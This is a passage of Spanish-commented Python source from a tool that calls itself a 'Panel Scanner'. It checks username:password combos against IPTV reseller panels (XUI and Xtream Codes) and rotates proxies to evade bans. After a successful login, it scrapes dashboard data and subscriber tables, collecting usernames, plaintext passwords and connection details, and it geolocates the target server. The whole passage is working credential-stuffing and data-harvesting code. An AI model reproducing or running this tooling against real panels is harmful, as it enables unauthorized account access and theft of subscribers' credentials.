        elapsed_seconds_total = int(elapsed_time)
        elapsed_days = elapsed_seconds_total // (24 * 3600)
        elapsed_hours = (elapsed_seconds_total % (24 * 3600)) // 3600
        elapsed_minutes = (elapsed_seconds_total % 3600) // 60
        elapsed_seconds = elapsed_seconds_total % 60

        elapsed_parts = []
        if elapsed_days > 0:
            elapsed_parts.append(f"{elapsed_days}d")
        if elapsed_hours > 0 or elapsed_days > 0:
            elapsed_parts.append(f"{elapsed_hours}h")
        elapsed_parts.append(f"{elapsed_minutes}m")
        elapsed_parts.append(f"{elapsed_seconds}s")
        return " ".join(elapsed_parts)

    def get_country_flag(self, country_code: str) -> str:
        try:
            return ''.join(chr(127397 + ord(c)) for c in country_code.upper())
        except Exception:
            return ""

    def get_server_info(self, host: str) -> Dict[str, Any]:
        api_url = f"http://ip-api.com/json/{host}"
        try:
            response = requests.get(api_url, timeout=10, verify=False)
            if response.status_code == 200:
                data = response.json()
                if data.get("status") == "success":
                    country_code = data.get("countryCode")
                    flag = self.get_country_flag(country_code) if country_code else ""
                    return {
                        "country": data.get("country", ""),
                        "city": data.get("city", ""),
                        "isp": data.get("isp", ""),
                        "query": data.get("query", ""),
                        "countryCode": country_code,
                        "flag": flag,
                        "timezone": data.get("timezone", "")
                    }
                return {"error": "No se pudo obtener información del servidor."}
            return {"error": f"Error en la solicitud: {response.status_code}"}
        except requests.RequestException as e:
            return {"error": f"Excepción durante la solicitud: {str(e)}"}
        
    def get_panel_type(self, url: str, timeout: int = 10) -> str:
        try:
            if not url.startswith(('http://', 'https://')):
                url = 'http://' + url
            print(f"{Fore.LIGHTCYAN_EX}📋 Obteniendo tipo de Panel...")
            session = requests.Session()
            session.headers.update(Config.get_login_headers())
            response = session.get(url, timeout=timeout, verify=False, allow_redirects=False)
            #response = requests.get(url, timeout=timeout, verify=False, allow_redirects=True, headers=Config.LOGIN_HEADERS)
            html = response.text.lower()
            soup = BeautifulSoup(html, 'html.parser')
            title_text = soup.title.text.lower() if soup.title else ''

            if 'xui' in title_text or 'xui panel' in html or 'xui login' in html:
                return 'xui'
            if any('admin & reseller interface' in h5.text.lower() for h5 in soup.find_all('h5', class_='auth-title')):
                return 'xtream_ui'
            if 'xtream codes' in html or 'xtream-codes' in html or '/login.php' in html:
                return 'xtream_codes'
            return 'unknown'
        except Exception as e:
            print(f"[!] Error analizando {url}: {e}")
            return 'unknown'

    def clean_url(self, url: str) -> str:
        parsed_url = urlparse(url)
        path_parts = parsed_url.path.strip('/').split('/')
        
        if path_parts and path_parts[0].lower() in ["login.php", "login", "panel.php"]:
            return f"{parsed_url.scheme}://{parsed_url.netloc}/"
        if path_parts and path_parts[0]:
            return f"{parsed_url.scheme}://{parsed_url.netloc}/{path_parts[0]}/"
        return f"{parsed_url.scheme}://{parsed_url.netloc}/"

    def get_dashboard_data(self, url: str, session: requests.Session, xui: bool, proxy_used: Any, proxy_handler: ProxyHandler, max_retries: int = 3) -> Dict[str, Any]:
        url_base = self.clean_url(url)
        url_final = urljoin(url_base, "api?action=dashboard" if xui else "api.php?action=reseller_dashboard")

        extra_headers = {
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "X-Requested-With": "XMLHttpRequest",
            "Referer": urljoin(url_base, "dashboard"),
        }

        current_proxy = (
            proxy_used
            if proxy_used
            else proxy_handler.get_proxy() if proxy_handler and proxy_handler.live_count > 0
            else None
        )

        for attempt in range(max_retries):
            try:
                response = session.get(
                    url_final,
                    headers={**session.headers, **extra_headers},
                    verify=False,
                    timeout=(5, 10),
                    proxies=current_proxy,
                )
                if response.status_code in [401, 403, 302]:
                    print("❌ Error de autenticación. La sesión podría haber expirado.")
                    return {}

                try:
                    data = response.json()
                    if Config.DEBUG_MODE:
                        print(f"[get_dashboard_data] Status Code {response.status_code}")
                        print(f"[get_dashboard_data] JSON:", data)
                    return data
                except ValueError:
                    print("⚠️ No se pudo convertir la respuesta a JSON.")
                    return {}

            except requests.RequestException as e:
                error_msg = RequestHandler.get_human_readable_error(e)
                proxy_str = current_proxy if current_proxy else "None"
                print(f"⚠️ [get_dashboard_data] Intento {attempt}/{max_retries} fallido ({proxy_str}): {error_msg}")
                if proxy_str != "None" and proxy_handler and proxy_handler.use_proxy:
                    current_proxy = proxy_handler.get_proxy()
                else:
                    pass
                continue

        print("❌ No se pudo obtener datos del dashboard tras varios intentos.")
        return {}
    
    def get_data_from_table_xui(self, url: str, session: requests.Session, proxy_used: Any, proxy_handler: ProxyHandler, max_retries: int = 3) -> List[Dict[str, Any]]:
        url_base = self.clean_url(url)
        url_final = urljoin(url_base, "table?draw=1&columns%5B0%5D%5Bdata%5D=0&columns%5B0%5D%5Bname%5D=&columns%5B0%5D%5Bsearchable%5D=true&columns%5B0%5D%5Borderable%5D=true&columns%5B0%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B0%5D%5Bsearch%5D%5Bregex%5D=false&columns%5B1%5D%5Bdata%5D=1&columns%5B1%5D%5Bname%5D=&columns%5B1%5D%5Bsearchable%5D=true&columns%5B1%5D%5Borderable%5D=true&columns%5B1%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B1%5D%5Bsearch%5D%5Bregex%5D=false&columns%5B2%5D%5Bdata%5D=2&columns%5B2%5D%5Bname%5D=&columns%5B2%5D%5Bsearchable%5D=true&columns%5B2%5D%5Borderable%5D=true&columns%5B2%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B2%5D%5Bsearch%5D%5Bregex%5D=false&columns%5B3%5D%5Bdata%5D=3&columns%5B3%5D%5Bname%5D=&columns%5B3%5D%5Bsearchable%5D=true&columns%5B3%5D%5Borderable%5D=true&columns%5B3%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B3%5D%5Bsearch%5D%5Bregex%5D=false&columns%5B4%5D%5Bdata%5D=4&columns%5B4%5D%5Bname%5D=&columns%5B4%5D%5Bsearchable%5D=true&columns%5B4%5D%5Borderable%5D=true&columns%5B4%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B4%5D%5Bsearch%5D%5Bregex%5D=false&columns%5B5%5D%5Bdata%5D=5&columns%5B5%5D%5Bname%5D=&columns%5B5%5D%5Bsearchable%5D=true&columns%5B5%5D%5Borderable%5D=true&columns%5B5%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B5%5D%5Bsearch%5D%5Bregex%5D=false&columns%5B6%5D%5Bdata%5D=6&columns%5B6%5D%5Bname%5D=&columns%5B6%5D%5Bsearchable%5D=true&columns%5B6%5D%5Borderable%5D=true&columns%5B6%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B6%5D%5Bsearch%5D%5Bregex%5D=false&columns%5B7%5D%5Bdata%5D=7&columns%5B7%5D%5Bname%5D=&columns%5B7%5D%5Bsearchable%5D=true&columns%5B7%5D%5Borderable%5D=true&columns%5B7%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B7%5D%5Bsearch%5D%5Bregex%5D=false&columns%5B8%5D%5Bdata%5D=8&columns%5B8%5D%5Bname%5D=&columns%5B8%5D%5Bsearchable%5D=true&columns%5B8%5D%5Borderable%5D=true&columns%5B8%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B8%5D%5Bsearch%5D%5Bregex%5D=false&columns%5B9%5D%5Bdata%5D=9&columns%5B9%5D%5Bname%5D=&columns%5B9%5D%5Bsearchable%5D=true&columns%5B9%5D%5Borderable%5D=true&columns%5B9%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B9%5D%5Bsearch%5D%5Bregex%5D=false&columns%5B10%5D%5Bdata%5D=10&columns%5B10%5D%5Bname%5D=&columns%5B10%5D%5Bsearchable%5D=true&columns%5B10%5D%5Borderable%5D=true&columns%5B10%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B10%5D%5Bsearch%5D%5Bregex%5D=false&columns%5B11%5D%5Bdata%5D=11&columns%5B11%5D%5Bname%5D=&columns%5B11%5D%5Bsearchable%5D=true&columns%5B11%5D%5Borderable%5D=false&columns%5B11%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B11%5D%5Bsearch%5D%5Bregex%5D=false&order%5B0%5D%5Bcolumn%5D=0&order%5B0%5D%5Bdir%5D=desc&start=0&length=1000&search%5Bvalue%5D=&search%5Bregex%5D=false&id=lines&filter=&reseller=&_=1739748406575")
        
        extra_headers = {
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "X-Requested-With": "XMLHttpRequest"
        }
        current_proxy = (
            proxy_used
            if proxy_used
            else proxy_handler.get_proxy() if proxy_handler and proxy_handler.live_count > 0
            else None
        )
        for attempt in range(max_retries):
            try:
                response = session.get(
                        url_final,
                        headers={**session.headers, **extra_headers},
                        verify=False,
                        timeout=(5, 10),
                        proxies=current_proxy,
                )
                if response.status_code != 200:
                    print(f"[ERROR] Error al obtener los datos de la API. Código de estado: {response.status_code}")
                    return []
                try:
                    data = response.json()
                    if Config.DEBUG_MODE:
                        print(f"[get_data_from_table_xui] Status Code {response.status_code}")
                        print(f"[get_data_from_table_xui] JSON:", data)
                except Exception:
                    return []
                if "data" not in data:
                    return []
                
                processed_data = []
                for row in data["data"]:
                    processed_row = {
                        "ID": row[0].split(">")[1].split("<")[0].strip(),
                        "Username": row[1].split(">")[1].split("<")[0].strip(),
                        "Password": row[2].strip(),
                        "Owner": row[3].split(">")[1].split("<")[0].strip(),
                        "Status": row[4].split("title=\"")[1].split("\"")[0].strip(),
                        "Online": "Yes" if "text-success" in row[5] else "No",
                        "Trial": "Yes" if "text-success" in row[6] else "No",
                        "Active_Connections": row[7].split(">")[-2].split("<")[0].strip() if "button" in row[7] else "0",
                        "Max_Connections": row[8].split(">")[-2].split("<")[0].strip() if "btn-secondary" in row[8] else "0",
                        "Expiration": row[9].split("<br/>")[0].strip(),
                        "Last_Connection": row[10].split("<br/>")[0].strip()
                    }
                    processed_data.append(processed_row)
                return processed_data
            except requests.RequestException as e:
                error_msg = RequestHandler.get_human_readable_error(e)
                proxy_str = current_proxy if current_proxy else "None"
                print(f"⚠️ [get_data_from_table_xui] Intento {attempt}/{max_retries} fallido ({proxy_str}): {error_msg}")
                if proxy_handler and proxy_handler.use_proxy:
                    current_proxy = proxy_handler.get_proxy()
                continue
          
        print("❌ No se pudo obtener datos de la tabla tras varios intentos.")
        return []      
            
    #url_final = urljoin(url_base, "table_search.php?draw=82&columns%5B0%5D%5Bdata%5D=0&columns%5B0%5D%5Bname%5D=&columns%5B0%5D%5Bsearchable%5D=true&columns%5B0%5D%5Borderable%5D=true&columns%5B0%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B0%5D%5Bsearch%5D%5Bregex%5D=false&columns%5B1%5D%5Bdata%5D=1&columns%5B1%5D%5Bname%5D=&columns%5B1%5D%5Bsearchable%5D=true&columns%5B1%5D%5Borderable%5D=true&columns%5B1%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B1%5D%5Bsearch%5D%5Bregex%5D=false&columns%5B2%5D%5Bdata%5D=2&columns%5B2%5D%5Bname%5D=&columns%5B2%5D%5Bsearchable%5D=true&columns%5B2%5D%5Borderable%5D=true&columns%5B2%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B2%5D%5Bsearch%5D%5Bregex%5D=false&columns%5B3%5D%5Bdata%5D=3&columns%5B3%5D%5Bname%5D=&columns%5B3%5D%5Bsearchable%5D=true&columns%5B3%5D%5Borderable%5D=true&columns%5B3%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B3%5D%5Bsearch%5D%5Bregex%5D=false&columns%5B4%5D%5Bdata%5D=4&columns%5B4%5D%5Bname%5D=&columns%5B4%5D%5Bsearchable%5D=true&columns%5B4%5D%5Borderable%5D=true&columns%5B4%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B4%5D%5Bsearch%5D%5Bregex%5D=false&columns%5B5%5D%5Bdata%5D=5&columns%5B5%5D%5Bname%5D=&columns%5B5%5D%5Bsearchable%5D=true&columns%5B5%5D%5Borderable%5D=true&columns%5B5%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B5%5D%5Bsearch%5D%5Bregex%5D=false&columns%5B6%5D%5Bdata%5D=6&columns%5B6%5D%5Bname%5D=&columns%5B6%5D%5Bsearchable%5D=true&columns%5B6%5D%5Borderable%5D=true&columns%5B6%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B6%5D%5Bsearch%5D%5Bregex%5D=false&columns%5B7%5D%5Bdata%5D=7&columns%5B7%5D%5Bname%5D=&columns%5B7%5D%5Bsearchable%5D=true&columns%5B7%5D%5Borderable%5D=true&columns%5B7%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B7%5D%5Bsearch%5D%5Bregex%5D=false&columns%5B8%5D%5Bdata%5D=8&columns%5B8%5D%5Bname%5D=&columns%5B8%5D%5Bsearchable%5D=true&columns%5B8%5D%5Borderable%5D=true&columns%5B8%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B8%5D%5Bsearch%5D%5Bregex%5D=false&columns%5B9%5D%5Bdata%5D=9&columns%5B9%5D%5Bname%5D=&columns%5B9%5D%5Bsearchable%5D=true&columns%5B9%5D%5Borderable%5D=true&columns%5B9%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B9%5D%5Bsearch%5D%5Bregex%5D=false&columns%5B10%5D%5Bdata%5D=10&columns%5B10%5D%5Bname%5D=&columns%5B10%5D%5Bsearchable%5D=true&columns%5B10%5D%5Borderable%5D=true&columns%5B10%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B10%5D%5Bsearch%5D%5Bregex%5D=false&columns%5B11%5D%5Bdata%5D=11&columns%5B11%5D%5Bname%5D=&columns%5B11%5D%5Bsearchable%5D=true&columns%5B11%5D%5Borderable%5D=false&columns%5B11%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B11%5D%5Bsearch%5D%5Bregex%5D=false&order%5B0%5D%5Bcolumn%5D=0&order%5B0%5D%5Bdir%5D=desc&start=0&length=1000&search%5Bvalue%5D=&search%5Bregex%5D=false&id=users&filter=1&reseller=&_=1745365824202")
    def get_data_from_table_xc(self, url: str, session: requests.Session, proxy_used, proxy_handler: ProxyHandler, max_retries: int = 3) -> List[Dict[str, Any]]:
        url_base = self.clean_url(url)
        url_final = urljoin(url_base, "table_search.php?draw=82&columns%5B0%5D%5Bdata%5D=0&columns%5B0%5D%5Bname%5D=&columns%5B0%5D%5Bsearchable%5D=true&columns%5B0%5D%5Borderable%5D=true&columns%5B0%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B0%5D%5Bsearch%5D%5Bregex%5D=false&columns%5B1%5D%5Bdata%5D=1&columns%5B1%5D%5Bname%5D=&columns%5B1%5D%5Bsearchable%5D=true&columns%5B1%5D%5Borderable%5D=true&columns%5B1%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B1%5D%5Bsearch%5D%5Bregex%5D=false&columns%5B2%5D%5Bdata%5D=2&columns%5B2%5D%5Bname%5D=&columns%5B2%5D%5Bsearchable%5D=true&columns%5B2%5D%5Borderable%5D=true&columns%5B2%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B2%5D%5Bsearch%5D%5Bregex%5D=false&columns%5B3%5D%5Bdata%5D=3&columns%5B3%5D%5Bname%5D=&columns%5B3%5D%5Bsearchable%5D=true&columns%5B3%5D%5Borderable%5D=true&columns%5B3%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B3%5D%5Bsearch%5D%5Bregex%5D=false&columns%5B4%5D%5Bdata%5D=4&columns%5B4%5D%5Bname%5D=&columns%5B4%5D%5Bsearchable%5D=true&columns%5B4%5D%5Borderable%5D=true&columns%5B4%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B4%5D%5Bsearch%5D%5Bregex%5D=false&columns%5B5%5D%5Bdata%5D=5&columns%5B5%5D%5Bname%5D=&columns%5B5%5D%5Bsearchable%5D=true&columns%5B5%5D%5Borderable%5D=true&columns%5B5%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B5%5D%5Bsearch%5D%5Bregex%5D=false&columns%5B6%5D%5Bdata%5D=6&columns%5B6%5D%5Bname%5D=&columns%5B6%5D%5Bsearchable%5D=true&columns%5B6%5D%5Borderable%5D=true&columns%5B6%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B6%5D%5Bsearch%5D%5Bregex%5D=false&columns%5B7%5D%5Bdata%5D=7&columns%5B7%5D%5Bname%5D=&columns%5B7%5D%5Bsearchable%5D=true&columns%5B7%5D%5Borderable%5D=true&columns%5B7%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B7%5D%5Bsearch%5D%5Bregex%5D=false&columns%5B8%5D%5Bdata%5D=8&columns%5B8%5D%5Bname%5D=&columns%5B8%5D%5Bsearchable%5D=true&columns%5B8%5D%5Borderable%5D=true&columns%5B8%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B8%5D%5Bsearch%5D%5Bregex%5D=false&columns%5B9%5D%5Bdata%5D=9&columns%5B9%5D%5Bname%5D=&columns%5B9%5D%5Bsearchable%5D=true&columns%5B9%5D%5Borderable%5D=true&columns%5B9%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B9%5D%5Bsearch%5D%5Bregex%5D=false&columns%5B10%5D%5Bdata%5D=10&columns%5B10%5D%5Bname%5D=&columns%5B10%5D%5Bsearchable%5D=true&columns%5B10%5D%5Borderable%5D=true&columns%5B10%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B10%5D%5Bsearch%5D%5Bregex%5D=false&columns%5B11%5D%5Bdata%5D=11&columns%5B11%5D%5Bname%5D=&columns%5B11%5D%5Bsearchable%5D=true&columns%5B11%5D%5Borderable%5D=false&columns%5B11%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B11%5D%5Bsearch%5D%5Bregex%5D=false&order%5B0%5D%5Bcolumn%5D=0&order%5B0%5D%5Bdir%5D=desc&start=0&length=1000&search%5Bvalue%5D=&search%5Bregex%5D=false&id=users&filter=1&reseller=&_=1745365824202")

        extra_headers = {
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "X-Requested-With": "XMLHttpRequest",
        }

        current_proxy = (
            proxy_used
            if proxy_used
            else proxy_handler.get_proxy() if proxy_handler and proxy_handler.live_count > 0
            else None
        )
        proxy_str = str(current_proxy) if current_proxy else "None"

        for attempt in range(max_retries):
            try:
                response = session.get(
                    url_final,
                    headers={**session.headers, **extra_headers},
                    verify=False,
                    timeout=(5, 10),
                    proxies=current_proxy,
                )

                if response.status_code != 200:
                    print(f"[ERROR] Código de estado HTTP: {response.status_code}")
                    continue

                data = response.json()
                if Config.DEBUG_MODE:
                    print(f"[get_data_from_table_xc] Status Code {response.status_code}")
                    print(f"[get_data_from_table_xc] JSON:", data)
                if "data" not in data:
                    return []

                processed_data = []
                for row in data["data"]:
                    is_old_server = len(row) > 7 and isinstance(row[7], str) and "Days" in row[7]
                    if is_old_server:
                        conn_text = row[8].split(">")[1].split("<")[0].strip() if "<" in str(row[8]) else row[8]
                        conn_parts = conn_text.split("/")
                        active_conn = conn_parts[0].strip() if len(conn_parts) > 0 else "0"
                        max_conn = conn_parts[1].strip() if len(conn_parts) > 1 else "1"
                        
                        processed_row = {
                            "ID": row[0].split(">")[1].split("<")[0].strip() if "<" in str(row[0]) else row[0],
                            "Username": row[1].split(">")[1].split("<")[0].strip() if "<" in str(row[1]) else row[1],
                            "Password": row[2],
                            "Owner": row[3],
                            "Status": "Active" if "btn-success" in str(row[4]) else "Inactive",
                            "Online": "N/A",
                            "Trial": "No" if "OFFICIAL" in str(row[5]) else "Yes",
                            "Expiration": row[6].split("<")[0].strip(),
                            "Active_Connections": active_conn,
                            "Max_Connections": max_conn,
                            "Last_Connection": "N/A"
                        }
                    else:
                        processed_row = {
                            "ID": row[0],
                            "Username": row[1],
                            "Password": row[2],
                            "Owner": row[3],
                            "Status": "Active" if "text-success" in row[4] else "Inactive",
                            "Online": "Yes" if "text-success" in row[5] else "No",
                            "Trial": "Yes" if "text-success" in row[6] else "No",
                            "Expiration": row[7],
                            "Active_Connections": row[8].split(">")[1].split("<")[0].strip() if isinstance(row[8], str) and "live_connections" in row[8] else "0",
                            "Max_Connections": row[9],
                            "Last_Connection": "Never" if row[10] == "Never" else row[10],
                        }
                    processed_data.append(processed_row)
                
                return processed_data

            except requests.RequestException as e:
                error_msg = RequestHandler.get_human_readable_error(e)
                print(f"⚠️ [get_data_from_table_xc] Intento {attempt + 1}/{max_retries} fallido: {error_msg}")
                if proxy_str != "None" and proxy_handler and proxy_handler.use_proxy:
                    current_proxy = proxy_handler.get_proxy()
                    proxy_str = str(current_proxy)
                else:
                    pass
                continue

        print("❌ No se pudo obtener los datos de la tabla tras varios intentos.")
        return []

    def get_status_str(self,status_code: int) -> str:
        if status_code == 200:
            return "ᴏᴋ⁽²⁰⁰⁾ ✅"
        elif status_code == 201:
            return "ᴄʀᴇᴀᴛᴇᴅ⁽²⁰¹⁾ 🎉"
        elif status_code == 202:
            return "ᴀᴄᴄᴇᴘᴛᴇᴅ⁽²⁰²⁾ 👍"
        elif status_code == 204:
            return "ɴᴏ ᴄᴏɴᴛᴇɴᴛ⁽²⁰⁴⁾ 🈳"
        elif status_code == 301:
            return "ᴍᴏᴠᴇᴅ ᴘᴇʀᴍᴀɴᴇɴᴛʟʏ⁽³⁰¹⁾ 🔀"
        elif status_code == 302:
            return "ғᴏᴜɴᴅ⁽³⁰²⁾ 🔁"
        elif status_code == 400:
            return "ʙᴀᴅ ʀᴇǫᴜᴇsᴛ⁽⁴⁰⁰⁾ ⚠️"
        elif status_code == 401:
            return "ᴜɴᴀᴜᴛʜᴏʀɪᴢᴇᴅ⁽⁴⁰¹⁾ 🔒"
        elif status_code == 403:
            return "ғᴏʀʙɪᴅᴅᴇɴ⁽⁴⁰³⁾ ⛔"
        elif status_code == 404:
            return "ɴᴏᴛ ғᴏᴜɴᴅ⁽⁴⁰⁴⁾ ❌"
        elif status_code == 429:
            return "ᴛᴏᴏ ᴍᴀɴʏ ʀᴇǫᴜᴇsᴛs⁽⁴²⁹⁾ 🚫"
        elif status_code == 500:
            return "sᴇʀᴠᴇʀ ᴇʀʀᴏʀ⁽⁵⁰⁰⁾ 💥"
        elif status_code == 502:
            return "ʙᴀᴅ ɢᴀᴛᴇᴡᴀʏ⁽⁵⁰²⁾ ⚡"
        elif status_code == 503:
            return "sᴇʀᴠɪᴄᴇ ᴜɴᴀᴠᴀɪʟᴀʙʟᴇ⁽⁵⁰³⁾ ⏳"
        elif status_code == 504:
            return "ɢᴀᴛᴇᴡᴀʏ ᴛɪᴍᴇᴏᴜᴛ⁽⁵⁰⁴⁾ ⌛"
        else:
            return f"{status_code}"
        
    def generate_banner(self, username: str, password: str, status_color: str, status_code: str,
                       total_combos: int, progress_percent: float, cpm: int, bot_id: str,
                       elapsed_str: str, server_info: Dict[str, Any], panel_type: str,
                       dynamic_color: str, contador_hits_str: str, contador_hits_m3u_str: str,
                       url_clean: str, proxy_handler: ProxyHandler, proxy_str: str) -> None:
        #if Config.DEBUG_MODE == False:
        #    os.system('cls' if os.name == 'nt' else 'clear')
        
        terminal_height = self.terminal_height
        
        status_line = f"{Fore.LIGHTCYAN_EX}┣◉ {Fore.RESET}{Fore.LIGHTYELLOW_EX}ResCode{Fore.RESET}  ➛ {status_color}{self.get_status_str(status_code)}{Fore.RESET}\n"
        proxy_section = ""
        if proxy_handler.use_proxy:
            proxy_section = (
                f"{Fore.LIGHTCYAN_EX}┏━━━━✦ 🧩  𝐏𝐑𝐎𝐗𝐈𝐄𝐒  🧩      {Fore.RESET}\n"
                f"{Fore.LIGHTCYAN_EX}┣◉ {Fore.RESET}{Fore.LIGHTYELLOW_EX}Used{Fore.RESET}     ➛ {Fore.LIGHTBLUE_EX}{proxy_str}{Fore.RESET}\n"
                f"{status_line}"
                f"{Fore.LIGHTCYAN_EX}┣◉ {Fore.RESET}{Fore.LIGHTYELLOW_EX}Status{Fore.RESET}   ➛ {Fore.LIGHTYELLOW_EX}｢ʟɪᴠᴇ▹{Fore.LIGHTGREEN_EX}{proxy_handler.live_count}{Fore.LIGHTYELLOW_EX} • ʙᴀɴɴᴇᴅ▹{Fore.LIGHTRED_EX}{proxy_handler.banned_count}{Fore.LIGHTYELLOW_EX}｣{Fore.RESET}\n"
                f"{Fore.LIGHTCYAN_EX}┗━━━━✦   {Fore.RESET}\n"
            )
        banner = (
            f"{Fore.LIGHTYELLOW_EX}»»——————————————————👑——————————————————«« {Fore.RESET}\n"
            f"{Fore.LIGHTYELLOW_EX}   _  _ _ _     _  _          _  {Fore.RESET}\n"
            f"{Fore.LIGHTYELLOW_EX}  | || {Fore.RED}(_){Fore.RESET}{Fore.LIGHTYELLOW_EX} |_  | || |_  _ _ _| |_ ___ _ _ {Fore.RESET}\n"
            f"{Fore.LIGHTYELLOW_EX}  | __ | |  _| | __ | || | ' \  _/ -_) '_| {Fore.RESET}\n"
            f"{Fore.LIGHTYELLOW_EX}  |_||_|_|\__| |_||_|\_,_|_||_\__\___|_| {Fore.RESET}\n"
            f"{Fore.LIGHTCYAN_EX}     {Fore.RED}彡★ {Fore.RESET}{Fore.LIGHTCYAN_EX}    𝐏𝐀𝐍𝐄𝐋 𝐒𝐂𝐀𝐍𝐍𝐄𝐑 ᴠ𝟕.𝟓  {Fore.RESET} {Fore.LIGHTRED_EX} ★彡 {Fore.RESET}\n"
            f"{Fore.LIGHTYELLOW_EX}»»——————————————————👑——————————————————«« {Fore.RESET}\n"
            f"\n"
            f"{Fore.LIGHTCYAN_EX}┏━━━━✦ 🛡️  𝐒𝐂𝐀𝐍𝐍𝐄𝐑 𝐈𝐍𝐅𝐎  🛡️       {Fore.RESET}\n"
            f"{Fore.LIGHTCYAN_EX}┣◉ {Fore.RESET}{Fore.LIGHTYELLOW_EX}Panel {Fore.RESET}   ➛ {Fore.YELLOW}{url_clean}{Fore.RESET}\n"
            f"{Fore.LIGHTCYAN_EX}┣◉ {Fore.RESET}{Fore.LIGHTYELLOW_EX}User:Pass{Fore.RESET}➛ {Fore.LIGHTCYAN_EX}{username}:{password}{Fore.RESET}\n"
            f"{Fore.LIGHTCYAN_EX}┣◉ {Fore.RESET}{Fore.LIGHTYELLOW_EX}Progress{Fore.RESET} ➛ {Fore.LIGHTGREEN_EX}{self.completed}/{total_combos} {Fore.RESET}{Fore.LIGHTYELLOW_EX}｢{Fore.LIGHTBLUE_EX}{progress_percent}%{Fore.LIGHTYELLOW_EX}｣{Fore.RESET}\n"
            f"{Fore.LIGHTCYAN_EX}┣◉ {Fore.RESET}{Fore.LIGHTYELLOW_EX}Bot{Fore.RESET}      ➛ {Fore.LIGHTMAGENTA_EX}{bot_id:<7} {Fore.LIGHTYELLOW_EX}• CPM ➛ {Fore.LIGHTMAGENTA_EX}{cpm}{Fore.RESET}\n"
            f"{Fore.LIGHTCYAN_EX}┣◉ {Fore.RESET}{Fore.LIGHTYELLOW_EX}Start{Fore.RESET}    ➛ {Fore.LIGHTRED_EX}{self.start_time_str}{Fore.RESET}\n"
            f"{Fore.LIGHTCYAN_EX}┣◉ {Fore.RESET}{Fore.LIGHTYELLOW_EX}Elapsed{Fore.RESET}  ➛ {Fore.CYAN}{elapsed_str}{Fore.RESET}\n"
            + ("" if proxy_handler.use_proxy else status_line) +
            f"{Fore.LIGHTCYAN_EX}┗━━━━✦    {Fore.RESET}\n"
            f"{proxy_section}"
            f"{Fore.LIGHTCYAN_EX}┏━━━━✦ 📡  𝐒𝐄𝐑𝐕𝐄𝐑 𝐈𝐍𝐅𝐎  📡       {Fore.RESET}\n"
            f"{Fore.LIGHTCYAN_EX}┣◉ {Fore.RESET}{Fore.LIGHTYELLOW_EX}Server {Fore.RESET}  ➛ {Fore.YELLOW}{server_info.get('query', '')}{Fore.RESET}\n"
            f"{Fore.LIGHTCYAN_EX}┣◉ {Fore.RESET}{Fore.LIGHTYELLOW_EX}Type {Fore.RESET}    ➛ {panel_type} {Fore.RESET}\n"
            + (
                f"{Fore.LIGHTCYAN_EX}┣◉ {Fore.RESET}{Fore.LIGHTYELLOW_EX}Country {Fore.RESET} ➛ {Fore.LIGHTMAGENTA_EX}{server_info['flag']} {server_info['country']} ｢{server_info['countryCode']}｣{Fore.RESET}\n"
                f"{Fore.LIGHTCYAN_EX}┣◉ {Fore.RESET}{Fore.LIGHTYELLOW_EX}City {Fore.RESET}    ➛ {Fore.LIGHTBLUE_EX}{server_info['city']}{Fore.RESET}\n"
                f"{Fore.LIGHTCYAN_EX}┣◉ {Fore.RESET}{Fore.LIGHTYELLOW_EX}ISP {Fore.RESET}     ➛ {Fore.LIGHTRED_EX}{server_info['isp']}{Fore.RESET}\n"
                if "error" not in server_info else
                f"{Fore.LIGHTCYAN_EX}┣◉ No se obtuvo información{Fore.RESET}\n"
            ) +
            f"{Fore.LIGHTCYAN_EX}┣◉ {Fore.RESET}{Fore.LIGHTYELLOW_EX}TimeZone {Fore.RESET}➛ {Fore.LIGHTCYAN_EX}{server_info.get('timezone', '')}{Fore.RESET}\n"
            f"{Fore.LIGHTCYAN_EX}┗━━━━✦    {Fore.RESET}\n"
            f"{Fore.LIGHTYELLOW_EX}»»——————————————————👑——————————————————«« {Fore.RESET}\n"
            f"{Fore.LIGHTCYAN_EX} {Fore.RESET}{dynamic_color}      ⚜️  ᴩy ᴅᴇᴠᴇʟᴏᴩᴇᴅ ʙʏ ɪꜱʜɪʀᴏ  ⚜️   {Fore.RESET}\n"
            f"{Fore.LIGHTGREEN_EX} _/﹋\_ {Fore.RESET}\n"
            f"{Fore.LIGHTWHITE_EX} ({Fore.RESET}{Fore.LIGHTRED_EX}҂{Fore.RESET}`_´) {Fore.RESET}\n"
